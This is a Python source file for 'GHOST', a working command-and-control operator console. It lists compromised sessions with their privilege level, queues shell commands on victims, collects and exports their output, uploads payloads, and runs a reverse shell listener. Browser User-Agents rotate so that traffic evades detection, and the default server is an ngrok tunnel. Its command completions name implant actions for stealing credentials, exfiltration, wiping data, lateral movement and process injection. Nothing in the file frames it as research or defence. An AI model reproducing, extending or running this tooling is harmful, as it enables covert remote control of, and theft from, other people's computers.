"""
GHOST Operator CLI — v3
─────────────────────────────────────────────────────────────────────────────
Enhanced with reverse shell listener, JSON output, verbose mode, and more.

Configuration priority (highest → lowest):
  1. CLI flags      (--url, --token, --proxy, --verbose, --json)
  2. Env vars       (GHOST_C2_URL, GHOST_OPERATOR_TOKEN, GHOST_PROXY)
  3. Config file    (~/.ghost/operator.json)

Commands:
  python c2_cli.py                          # interactive session picker
  python c2_cli.py sessions [--json]        # list active sessions
  python c2_cli.py shell <sid>              # shell into a specific session
  python c2_cli.py task <sid> <cmd>         # queue a single command
  python c2_cli.py results <sid> [--clear] [--json]  # retrieve results
  python c2_cli.py audit [--limit N] [--json]        # view operator audit log
  python c2_cli.py watch [--interval N]     # live-refresh session list
  python c2_cli.py batch <sid> <cmd1>;<cmd2>;...  # queue multiple commands
  python c2_cli.py export <sid> [file]      # dump all results to file
  python c2_cli.py payload upload <file>    # upload payload to c2 server
  python c2_cli.py listen --port <port>     # start reverse shell listener
  python c2_cli.py config show              # show current config
  python c2_cli.py config set --url <url> --token <tok>  # save config
"""

from __future__ import annotations

import argparse
import json
import os
import platform
import random
import socket
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional
from urllib.parse import quote

# ── Optional readline (best-effort; Windows ships without it) ─────────────────
try:
    import readline
    _READLINE = True
except ImportError:
    _READLINE = False

try:
    import requests
    import urllib3
except ImportError:
    sys.exit("[!] Missing dependency: pip install requests urllib3")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────────────────────────────────────
#  Config paths
# ─────────────────────────────────────────────────────────────────────────────
CONFIG_DIR  = Path.home() / ".ghost"
CONFIG_FILE = CONFIG_DIR / "operator.json"
HISTORY_FILE = CONFIG_DIR / "history"

# ─────────────────────────────────────────────────────────────────────────────
#  ANSI colours
# ─────────────────────────────────────────────────────────────────────────────
def _color_support() -> bool:
    return (
        platform.system() != "Windows"
        or "ANSICON" in os.environ
        or "WT_SESSION" in os.environ
        or os.environ.get("TERM_PROGRAM") == "vscode"
    ) and hasattr(sys.stdout, "isatty") and sys.stdout.isatty()

_C = _color_support()

RESET   = "\033[0m"   if _C else ""
BOLD    = "\033[1m"   if _C else ""
RED     = "\033[91m"  if _C else ""
GREEN   = "\033[92m"  if _C else ""
YELLOW  = "\033[93m"  if _C else ""
CYAN    = "\033[96m"  if _C else ""
GREY    = "\033[90m"  if _C else ""
MAGENTA = "\033[95m"  if _C else ""
WHITE   = "\033[97m"  if _C else ""

def c(text: str, color: str) -> str:
    return f"{color}{text}{RESET}" if _C else text

def ok(msg: str)   -> None: print(c(f"[+] {msg}", GREEN))
def err(msg: str)  -> None: print(c(f"[!] {msg}", RED), file=sys.stderr)
def info(msg: str) -> None: print(c(f"[*] {msg}", CYAN))
def warn(msg: str) -> None: print(c(f"[-] {msg}", YELLOW))

# ─────────────────────────────────────────────────────────────────────────────
#  Operator rotating User-Agents — blend into normal browser traffic
# ─────────────────────────────────────────────────────────────────────────────
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) "
    "Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

def _pick_ua() -> str:
    return random.choice(_USER_AGENTS)

# ─────────────────────────────────────────────────────────────────────────────
#  Config persistence
# ─────────────────────────────────────────────────────────────────────────────

def load_config() -> dict:
    if CONFIG_FILE.exists():
        try:
            return json.loads(CONFIG_FILE.read_text())
        except Exception:
            pass
    return {}


def save_config(cfg: dict) -> None:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    CONFIG_FILE.write_text(json.dumps(cfg, indent=2))
    CONFIG_FILE.chmod(0o600)
    ok(f"Config saved → {CONFIG_FILE}")


def resolve_config(args: argparse.Namespace) -> tuple[str, str, Optional[str]]:
    """Return (url, token, proxy) by merging config file < env < CLI args."""
    file_cfg = load_config()

    url   = (getattr(args, "url",   None)
             or os.environ.get("GHOST_C2_URL")
             or file_cfg.get("url", ""))
    token = (getattr(args, "token", None)
             or os.environ.get("GHOST_OPERATOR_TOKEN")
             or file_cfg.get("token", ""))
    proxy = (getattr(args, "proxy", None)
             or os.environ.get("GHOST_PROXY")
             or file_cfg.get("proxy"))

    if not url:
        err("No C2 URL configured. Set one of:")
        err("  --url https://mute-attempt-fossil.ngrok-free.dev")
        err("  GHOST_C2_URL env var")
        err("  python c2_cli.py config set --url <url> --token <tok>")
        sys.exit(1)
    if not token:
        err("No operator token. Set one of:")
        err("  --token <tok>")
        err("  GHOST_OPERATOR_TOKEN env var")
        err("  python c2_cli.py config set --url <url> --token <tok>")
        sys.exit(1)

    return url.rstrip("/"), token, proxy

# ─────────────────────────────────────────────────────────────────────────────
#  Time helpers
# ─────────────────────────────────────────────────────────────────────────────

def _human_ago(iso: str) -> str:
    try:
        dt = datetime.fromisoformat(iso)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        diff = (datetime.now(timezone.utc) - dt).total_seconds()
        if diff < 60:    return f"{int(diff)}s ago"
        if diff < 3600:  return f"{int(diff//60)}m ago"
        if diff < 86400: return f"{int(diff//3600)}h ago"
        return f"{int(diff//86400)}d ago"
    except Exception:
        return iso[:19]


def _beacon_color(iso: str) -> str:
    try:
        dt = datetime.fromisoformat(iso)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        s = (datetime.now(timezone.utc) - dt).total_seconds()
        return GREEN if s < 60 else YELLOW if s < 300 else RED
    except Exception:
        return GREY

# ─────────────────────────────────────────────────────────────────────────────
#  HTTP client — rotating UA, retry with exponential back-off, proxy support
# ─────────────────────────────────────────────────────────────────────────────

class GhostClient:
    _RETRY_DELAYS = (1, 2, 4)   # seconds between retries

    def __init__(self, base_url: str, token: str,
                 proxy: Optional[str] = None,
                 ssl_verify: bool = False,
                 verbose: bool = False) -> None:
        self.base_url   = base_url.rstrip("/")
        self._token     = token
        self._ssl_verify = ssl_verify
        self._proxies   = {"https": proxy, "http": proxy} if proxy else None
        self._verbose   = verbose

        # Session is rebuilt each call so UA rotates per request
        self._lock = threading.Lock()

    def _session(self) -> requests.Session:
        s = requests.Session()
        s.verify = self._ssl_verify
        s.headers.update({
            "User-Agent":        _pick_ua(),
            "X-Operator-Token":  self._token,
            "Content-Type":      "application/json",
            "Accept":            "application/json",
            "Accept-Language":   "en-US,en;q=0.9",
            "Accept-Encoding":   "gzip, deflate, br",
            "Cache-Control":     "no-cache",
        })
        if self._proxies:
            s.proxies.update(self._proxies)
        return s

    def _request(self, method: str, path: str, **kwargs) -> requests.Response:
        url = f"{self.base_url}{path}"
        last_exc: Exception = RuntimeError("no attempts")
        verbose = self._verbose

        for attempt, delay in enumerate((*self._RETRY_DELAYS, None), 1):
            try:
                with self._lock:
                    sess = self._session()
                if verbose:
                    print(c(f"[DEBUG] {method} {url}", GREY), file=sys.stderr)
                    if "json" in kwargs:
                        print(c(f"[DEBUG] Body: {json.dumps(kwargs['json'], indent=2)}", GREY), file=sys.stderr)
                resp = sess.request(method, url, timeout=20, **kwargs)
                if verbose:
                    print(c(f"[DEBUG] Status: {resp.status_code}", GREY), file=sys.stderr)
                    if resp.text:
                        print(c(f"[DEBUG] Response: {resp.text[:500]}", GREY), file=sys.stderr)
                resp.raise_for_status()
                return resp
            except (requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout) as exc:
                last_exc = exc
                if delay is not None:
                    warn(f"Network error (attempt {attempt}), retrying in {delay}s…")
                    time.sleep(delay)
            except requests.exceptions.HTTPError as e:
                if verbose:
                    print(c(f"[DEBUG] HTTP error: {e.response.status_code} - {e.response.text[:200]}", RED), file=sys.stderr)
                raise
            except Exception as e:
                if verbose:
                    print(c(f"[DEBUG] Unexpected error: {e}", RED), file=sys.stderr)
                raise
        raise last_exc

    def _get(self, path: str, params: Optional[dict] = None) -> dict | list:
        return self._request("GET", path, params=params).json()

    def _post(self, path: str, payload: dict) -> dict:
        return self._request("POST", path, json=payload).json()

    def _delete(self, path: str) -> dict:
        return self._request("DELETE", path).json()

    # ── API ──────────────────────────────────────────────────────────────────

    def ping(self) -> bool:
        try:
            r = self._request("GET", "/ping")
            return r.status_code == 200
        except Exception:
            return False

    def list_sessions(self) -> list:
        return self._get("/sessions")  # type: ignore[return-value]

    def task(self, sid: str, cmd: str) -> dict:
        return self._post("/task", {"session": sid, "cmd": cmd})

    def results(self, sid: str, clear: bool = False) -> dict:
        params = {"clear": "1"} if clear else {}
        return self._get(f"/results/{quote(sid, safe='')}", params=params)  # type: ignore[return-value]

    def kill(self, sid: str) -> dict:
        return self._delete(f"/sessions/{quote(sid, safe='')}")

    def audit(self, limit: int = 50) -> dict:
        return self._get("/audit", params={"limit": limit})  # type: ignore[return-value]

    def upload_payload(self, data: bytes) -> dict:
        """Upload a raw binary payload to the C2 server."""
        url  = f"{self.base_url}/payload"
        sess = self._session()
        sess.headers["Content-Type"] = "application/octet-stream"
        del sess.headers["Accept"]          # don't advertise JSON for binary upload
        resp = sess.post(url, data=data, timeout=60, verify=self._ssl_verify)
        resp.raise_for_status()
        return resp.json()

# ─────────────────────────────────────────────────────────────────────────────
#  Display helpers
# ─────────────────────────────────────────────────────────────────────────────
_COL = [36, 16, 12, 9, 14, 6, 7, 8]  # SESSION / IP / LAST / IDLE / HOST / ELEV / TASKS / RESULTS

def print_sessions_table(sessions: list, numbered: bool = False) -> None:
    if not sessions:
        warn("No active sessions.")
        return

    hdr = (
        f"{'#':<4}" if numbered else ""
    ) + (
        f"{'SESSION ID':<{_COL[0]}} "
        f"{'REMOTE IP':<{_COL[1]}} "
        f"{'LAST SEEN':<{_COL[2]}} "
        f"{'IDLE':<{_COL[3]}} "
        f"{'HOSTNAME':<{_COL[4]}} "
        f"{'ELEV':<{_COL[5]}} "
        f"{'TASKS':<{_COL[6]}} "
        f"{'RESULTS':<{_COL[7]}}"
    )
    sep_len = sum(_COL) + len(_COL) - 1 + (4 if numbered else 0)

    print()
    print(c(hdr, BOLD + CYAN))
    print(c("─" * sep_len, GREY))

    for idx, s in enumerate(sessions, 1):
        last  = s.get("last_beacon", "")
        recon = s.get("recon", {})
        idle  = s.get("idle_seconds", 0)

        ago_str = _human_ago(last)
        idle_col = GREEN if idle < 60 else YELLOW if idle < 300 else RED
        elev_col = RED if recon.get("elevated") else GREY

        row = (
            (f"{c(str(idx), MAGENTA):<4}" if numbered else "")
            + f"{c(s['session'][:_COL[0]], MAGENTA):<{_COL[0]}} "
            + f"{s.get('remote_ip','?')[:_COL[1]]:<{_COL[1]}} "
            + f"{c(ago_str, _beacon_color(last)):<{_COL[2]+10}} "
            + f"{c(f'{idle:.0f}s', idle_col):<{_COL[3]+10}} "
            + f"{recon.get('hostname','?')[:_COL[4]]:<{_COL[4]}} "
            + f"{c('YES' if recon.get('elevated') else 'no', elev_col):<{_COL[5]+10}} "
            + f"{str(s.get('pending_tasks',0)):<{_COL[6]}} "
            + f"{str(s.get('result_count',0)):<{_COL[7]}}"
        )
        print(row)
    print()


def print_results(data: dict, header: bool = True, latest_only: bool = False) -> None:
    entries = data.get("results", [])
    sid     = data.get("session", "?")
    if not entries:
        warn(f"No results for {sid[:16]}…")
        return
    if header:
        print()
    display = entries[-1:] if latest_only else entries
    for e in display:
        if isinstance(e, dict):
            ts  = e.get("ts", "")
            out = e.get("output", "").rstrip()
        else:
            ts, out = "", str(e).rstrip()
        if ts:
            print(c(f"── {ts} ──", GREY))
        print(out)
        print()


def print_audit(data: dict) -> None:
    entries = data.get("entries", [])
    if not entries:
        warn("Audit log is empty.")
        return
    print()
    for e in entries:
        ts     = e.get("ts", "")[:19]
        action = e.get("action", "?")
        ip     = e.get("ip", "?")
        rest   = {k: v for k, v in e.items() if k not in ("ts", "action", "ip")}
        detail = json.dumps(rest, separators=(",", ":")) if rest else ""
        print(
            f"{c(ts, GREY)}  "
            f"{c(action, CYAN):<30}  "
            f"{c(ip, YELLOW)}  "
            f"{detail}"
        )
    print()

# ─────────────────────────────────────────────────────────────────────────────
#  Reverse shell listener
# ─────────────────────────────────────────────────────────────────────────────

def cmd_listen(client: GhostClient, args: argparse.Namespace) -> None:
    port = args.port

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', port))
    except OSError as e:
        err(f"Failed to bind port {port}: {e}")
        return

    server.listen(5)
    info(f"Listening for reverse shells on port {port}...")

    def handle_client(conn: socket.socket, addr: tuple):
        info(f"Incoming shell from {addr[0]}:{addr[1]}")
        # Send a prompt
        conn.send(b"GHOST reverse shell connected.\r\n")
        # We'll spawn a thread for reading from socket->stdout and another for stdin->socket
        def reader():
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                except Exception:
                    break
        def writer():
            while True:
                try:
                    line = sys.stdin.readline()
                    if not line:
                        break
                    conn.send(line.encode())
                except Exception:
                    break
        t1 = threading.Thread(target=reader, daemon=True)
        t2 = threading.Thread(target=writer, daemon=True)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        conn.close()
        info(f"Shell from {addr[0]} closed.")

    try:
        while True:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        info("Listener stopped.")
        server.close()

# ─────────────────────────────────────────────────────────────────────────────
#  Shell mode — non-blocking background result poller
# ─────────────────────────────────────────────────────────────────────────────

class _ResultPoller(threading.Thread):
    INTERVAL = 2.0

    def __init__(self, client: GhostClient, sid: str) -> None:
        super().__init__(daemon=True)
        self._client = client
        self._sid    = sid
        self._stop   = threading.Event()
        self._waiting: bool = False
        self._lock   = threading.Lock()

    def expect(self) -> None:
        with self._lock:
            self._waiting = True

    def got_result(self) -> None:
        with self._lock:
            self._waiting = False

    @property
    def is_waiting(self) -> bool:
        with self._lock:
            return self._waiting

    def stop(self) -> None:
        self._stop.set()

    def run(self) -> None:
        while not self._stop.wait(self.INTERVAL):
            if not self.is_waiting:
                continue
            try:
                data = self._client.results(self._sid, clear=True)
                if data.get("results"):
                    sys.stdout.write("\r\033[K")
                    print_results(data, header=False)
                    self.got_result()
                    sys.stdout.write(
                        c(f"ghost({self._sid[:8]})> ", BOLD + GREEN)
                    )
                    sys.stdout.flush()
            except Exception:
                pass

def _setup_readline(sid: str) -> None:
    if not _READLINE:
        return
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    try:
        readline.read_history_file(str(HISTORY_FILE))
    except FileNotFoundError:
        pass
    readline.set_history_length(500)

    _COMPLETIONS = [
        "!ps ", "!lol ", "!inject ", "!inject-apc ", "!migrate ",
        "!exfil ", "!wipe ", "!lateral ", "!creds",
        "!wallpaper ", "!browser ", "!telegram ", "!reverse ",
        "ps", "download ", "upload ", "exit", "bg", "sleep",
    ]
    def _complete(text: str, state: int) -> Optional[str]:
        opts = [c for c in _COMPLETIONS if c.startswith(text)]
        return opts[state] if state < len(opts) else None

    readline.set_completer(_complete)
    readline.parse_and_bind("tab: complete")

def _save_readline() -> None:
    if not _READLINE:
        return
    try:
        readline.write_history_file(str(HISTORY_FILE))
    except Exception:
        pass

def cmd_shell(client: GhostClient, sid: str) -> None:
    _setup_readline(sid)
    info(f"Shell → {c(sid, MAGENTA)}")
    info("Commands: bg (background) | exit (kill) | Ctrl-C (background)")
    print()

    poller = _ResultPoller(client, sid)
    poller.start()

    try:
        while True:
            try:
                raw = input(c(f"ghost({sid[:8]})> ", BOLD + GREEN))
            except (EOFError, KeyboardInterrupt):
                print()
                warn("Backgrounding session.")
                break

            cmd = raw.strip()
            if not cmd:
                continue
            if cmd.lower() == "bg":
                warn("Backgrounding session (not killed).")
                break
            if cmd.lower() == "exit":
                try:
                    client.kill(sid)
                    ok("Session killed.")
                except requests.HTTPError as e:
                    if e.response.status_code == 404:
                        warn("Session already gone.")
                break

            try:
                resp = client.task(sid, cmd)
                info(f"Queued  depth={resp.get('queue_depth','?')}")
            except requests.HTTPError as e:
                if e.response.status_code == 404:
                    err("Session not found — may have expired.")
                    break
                err(f"Task failed: {e}")
                continue

            poller.expect()
            deadline = time.time() + 90
            spinner  = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
            i        = 0
            while poller.is_waiting and time.time() < deadline:
                sys.stdout.write(
                    f"\r{c(spinner[i % len(spinner)], CYAN)} waiting…"
                )
                sys.stdout.flush()
                time.sleep(0.15)
                i += 1
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()

            if poller.is_waiting:
                poller.got_result()
                warn("Timed out waiting for result (90 s).")
    finally:
        poller.stop()
        _save_readline()

# ─────────────────────────────────────────────────────────────────────────────
#  Watch mode — live-refreshing session list with notifications
# ─────────────────────────────────────────────────────────────────────────────

def cmd_watch(client: GhostClient, interval: int = 5) -> None:
    info(f"Watch mode — refreshing every {interval}s  (Ctrl-C to stop)")
    last_sessions = []
    try:
        while True:
            print("\033[H\033[J", end="")
            print(c(f"GHOST SESSIONS  {datetime.now().strftime('%H:%M:%S')}", BOLD + CYAN))
            try:
                sessions = client.list_sessions()
                # Check for new sessions
                current_ids = {s['session'] for s in sessions}
                last_ids = {s['session'] for s in last_sessions}
                new_ids = current_ids - last_ids
                if new_ids:
                    info(f"New session(s): {', '.join(new_ids)}")
                print_sessions_table(sessions)
                last_sessions = sessions
            except Exception as exc:
                err(str(exc))
            time.sleep(interval)
    except KeyboardInterrupt:
        print()

# ─────────────────────────────────────────────────────────────────────────────
#  Batch tasking
# ─────────────────────────────────────────────────────────────────────────────

def cmd_batch(client: GhostClient, sid: str, commands: str) -> None:
    cmds = [c.strip() for c in commands.split(";") if c.strip()]
    if not cmds:
        err("No commands found. Separate with semicolons: cmd1;cmd2;cmd3")
        return
    info(f"Queuing {len(cmds)} commands on {sid[:16]}…")
    for i, cmd in enumerate(cmds, 1):
        try:
            resp = client.task(sid, cmd)
            ok(f"[{i}/{len(cmds)}] {c(cmd[:60], WHITE)}  depth={resp.get('queue_depth','?')}")
        except requests.HTTPError as e:
            err(f"[{i}/{len(cmds)}] Failed: {e}")

# ─────────────────────────────────────────────────────────────────────────────
#  Export results to file
# ─────────────────────────────────────────────────────────────────────────────

def cmd_export(client: GhostClient, sid: str, outfile: Optional[str]) -> None:
    info(f"Fetching results for {sid[:16]}…")
    try:
        data = client.results(sid, clear=False)
    except requests.HTTPError as e:
        err(str(e))
        return

    entries = data.get("results", [])
    if not entries:
        warn("No results to export.")
        return

    if outfile:
        path = Path(outfile)
    else:
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = Path(f"ghost_{sid[:8]}_{ts}.txt")

    lines: list[str] = [
        f"GHOST export — session {sid}",
        f"Generated: {datetime.now().isoformat()}",
        "=" * 72,
        "",
    ]
    for e in entries:
        if isinstance(e, dict):
            lines.append(f"── {e.get('ts','')} ──")
            lines.append(e.get("output", "").rstrip())
        else:
            lines.append(str(e).rstrip())
        lines.append("")

    path.write_text("\n".join(lines), encoding="utf-8")
    ok(f"Exported {len(entries)} result(s) → {path}")

# ─────────────────────────────────────────────────────────────────────────────
#  Payload management
# ─────────────────────────────────────────────────────────────────────────────

def cmd_payload(client: GhostClient, action: str, filepath: Optional[str]) -> None:
    if action == "upload":
        if not filepath:
            err("Usage: payload upload <file>")
            return
        p = Path(filepath)
        if not p.exists():
            err(f"File not found: {filepath}")
            return
        data = p.read_bytes()
        info(f"Uploading {p.name} ({len(data):,} bytes)…")
        try:
            resp = client.upload_payload(data)
            ok(f"Uploaded — {resp}")
        except Exception as exc:
            err(str(exc))
    else:
        err(f"Unknown payload action: {action}")

# ─────────────────────────────────────────────────────────────────────────────
#  Interactive console (session picker)
# ─────────────────────────────────────────────────────────────────────────────

def cmd_console(client: GhostClient, json_output: bool = False) -> None:
    while True:
        if not json_output:
            info("Fetching sessions…")
        try:
            sessions = client.list_sessions()
        except requests.HTTPError as e:
            err(f"Failed: {e}")
            time.sleep(3)
            continue
        except Exception as exc:
            err(str(exc))
            time.sleep(3)
            continue

        if not sessions:
            if json_output:
                print(json.dumps([]))
                return
            warn("No active sessions. Retrying in 5 s…")
            time.sleep(5)
            continue

        if json_output:
            print(json.dumps(sessions, indent=2))
            return

        print_sessions_table(sessions, numbered=True)

        while True:
            try:
                choice = input(
                    c("Select # (or 'r' refresh / 'q' quit): ", BOLD + CYAN)
                ).strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                info("Goodbye.")
                return

            if choice in ("q", "quit", "exit"):
                info("Goodbye.")
                return
            if choice in ("r", "refresh", ""):
                break  # re-fetch and re-display

            if not choice.isdigit():
                warn("Enter a number.")
                continue
            idx = int(choice) - 1
            if not (0 <= idx < len(sessions)):
                warn(f"Choose 1–{len(sessions)}.")
                continue

            sid = sessions[idx]["session"]
            info(f"Connecting → {c(sid, MAGENTA)}")
            cmd_shell(client, sid)
            info("Returning to session list…")
            break   # re-fetch sessions after shell returns

# ─────────────────────────────────────────────────────────────────────────────
#  Config commands
# ─────────────────────────────────────────────────────────────────────────────

def cmd_config(action: str, args: argparse.Namespace) -> None:
    if action == "show":
        cfg  = load_config()
        url  = os.environ.get("GHOST_C2_URL")  or cfg.get("url",   "(not set)")
        tok  = os.environ.get("GHOST_OPERATOR_TOKEN") or cfg.get("token", "(not set)")
        prx  = os.environ.get("GHOST_PROXY")   or cfg.get("proxy", "(not set)")

        masked = tok[:8] + "…" if len(tok) > 8 else tok

        print()
        print(f"  {c('URL',   CYAN):<20} {url}")
        print(f"  {c('Token', CYAN):<20} {masked}")
        print(f"  {c('Proxy', CYAN):<20} {prx}")
        print(f"  {c('Config file', CYAN):<20} {CONFIG_FILE}")
        print()
    elif action == "set":
        cfg = load_config()
        if getattr(args, "url",   None): cfg["url"]   = args.url
        if getattr(args, "token", None): cfg["token"] = args.token
        if getattr(args, "proxy", None): cfg["proxy"] = args.proxy
        save_config(cfg)
    else:
        err(f"Unknown config action: {action}")

# ─────────────────────────────────────────────────────────────────────────────
#  Argument parser
# ─────────────────────────────────────────────────────────────────────────────

def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="c2_cli",
        description="GHOST C2 Operator CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--url",        default=None,
                   help="C2 Worker URL (env: GHOST_C2_URL)")
    p.add_argument("--token",      default=None,
                   help="Operator token (env: GHOST_OPERATOR_TOKEN)")
    p.add_argument("--proxy",      default=None,
                   help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("--ssl-verify", action="store_true", default=False,
                   help="Verify TLS certificate")
    p.add_argument("--verbose",    action="store_true", default=False,
                   help="Print debug information (requests, responses)")
    p.add_argument("--json",       action="store_true", default=False,
                   help="Output data in JSON format (for scripts)")

    sub = p.add_subparsers(dest="command", metavar="COMMAND")

    # sessions
    s = sub.add_parser("sessions", help="List active sessions")
    s.add_argument("--json", action="store_true", help="Output as JSON")

    # shell
    sh = sub.add_parser("shell", help="Interactive shell on a session")
    sh.add_argument("sid", help="Session ID")

    # task
    t = sub.add_parser("task", help="Queue a single command")
    t.add_argument("sid")
    t.add_argument("cmd")

    # batch
    bt = sub.add_parser("batch", help="Queue multiple commands (semicolon-separated)")
    bt.add_argument("sid")
    bt.add_argument("commands", help="e.g. 'whoami;ipconfig;net user'")

    # results
    r = sub.add_parser("results", help="Retrieve results for a session")
    r.add_argument("sid")
    r.add_argument("--clear", action="store_true",
                   help="Delete results after fetching")
    r.add_argument("--all", dest="show_all", action="store_true",
                   help="Show all results (default: latest only)")
    r.add_argument("--json", action="store_true", help="Output as JSON")

    # export
    ex = sub.add_parser("export", help="Dump all results to a file")
    ex.add_argument("sid")
    ex.add_argument("outfile", nargs="?", default=None)

    # kill
    k = sub.add_parser("kill", help="Queue exit and remove session")
    k.add_argument("sid")

    # audit
    a = sub.add_parser("audit", help="View operator audit log")
    a.add_argument("--limit", type=int, default=50)
    a.add_argument("--json", action="store_true", help="Output as JSON")

    # watch
    w = sub.add_parser("watch", help="Live-refresh session list")
    w.add_argument("--interval", type=int, default=5)

    # payload
    pl = sub.add_parser("payload", help="Upload payload to C2 server")
    pl.add_argument("action", choices=["upload"])
    pl.add_argument("filepath", nargs="?", default=None)

    # config
    cfg = sub.add_parser("config", help="Manage operator config")
    cfg.add_argument("action", choices=["show", "set"])
    cfg.add_argument("--url",   default=None)
    cfg.add_argument("--token", default=None)
    cfg.add_argument("--proxy", default=None)

    # console (default)
    co = sub.add_parser("console", help="Interactive session picker (default)")
    co.add_argument("--json", action="store_true", help="Output as JSON (single shot)")

    # ping
    sub.add_parser("ping", help="Check Worker reachability")

    # listen (new)
    li = sub.add_parser("listen", help="Start reverse shell listener")
    li.add_argument("--port", type=int, default=4444, help="Port to listen on (default: 4444)")

    return p

# ─────────────────────────────────────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = _build_parser()
    args   = parser.parse_args()

    if args.command == "config":
        cmd_config(args.action, args)
        return

    if not args.command:
        args.command = "console"

    url, token, proxy = resolve_config(args)

    client = GhostClient(
        base_url   = url,
        token      = token,
        proxy      = proxy,
        ssl_verify = getattr(args, "ssl_verify", False),
        verbose    = getattr(args, "verbose", False),
    )

    # Handle JSON output for commands that support it
    json_out = getattr(args, "json", False)

    try:
        match args.command:

            case "ping":
                if client.ping():
                    ok(f"Worker reachable → {url}")
                else:
                    err(f"Worker unreachable → {url}")
                    sys.exit(1)

            case "sessions":
                data = client.list_sessions()
                if json_out or getattr(args, "json", False):
                    print(json.dumps(data, indent=2))
                else:
                    print_sessions_table(data)

            case "shell":
                cmd_shell(client, args.sid)

            case "task":
                resp = client.task(args.sid, args.cmd)
                ok(f"Queued on {args.sid[:16]}  depth={resp.get('queue_depth','?')}")

            case "batch":
                cmd_batch(client, args.sid, args.commands)

            case "results":
                do_clear   = args.clear or not getattr(args, "show_all", False)
                latest_only = not getattr(args, "show_all", False)
                data = client.results(args.sid, clear=do_clear)
                if json_out or getattr(args, "json", False):
                    print(json.dumps(data, indent=2))
                else:
                    print_results(data, latest_only=latest_only)

            case "export":
                cmd_export(client, args.sid, getattr(args, "outfile", None))

            case "kill":
                resp = client.kill(args.sid)
                ok(f"Exit queued for {args.sid[:16]} — {resp.get('status','')}")

            case "audit":
                data = client.audit(limit=args.limit)
                if json_out or getattr(args, "json", False):
                    print(json.dumps(data, indent=2))
                else:
                    print_audit(data)

            case "watch":
                cmd_watch(client, interval=args.interval)

            case "payload":
                cmd_payload(client, args.action, getattr(args, "filepath", None))

            case "listen":
                cmd_listen(client, args)

            case "console" | _:
                cmd_console(client, json_out)

    except requests.exceptions.ConnectionError:
        err(f"Cannot connect to {url}")
        err("Verify: c2_server.py is running and ngrok is forwarding to it.")
        sys.exit(1)
    except requests.exceptions.HTTPError as e:
        err(f"HTTP {e.response.status_code}: {e.response.text[:200]}")
        sys.exit(1)
    except KeyboardInterrupt:
        print()
        sys.exit(0)


if __name__ == "__main__":
    main()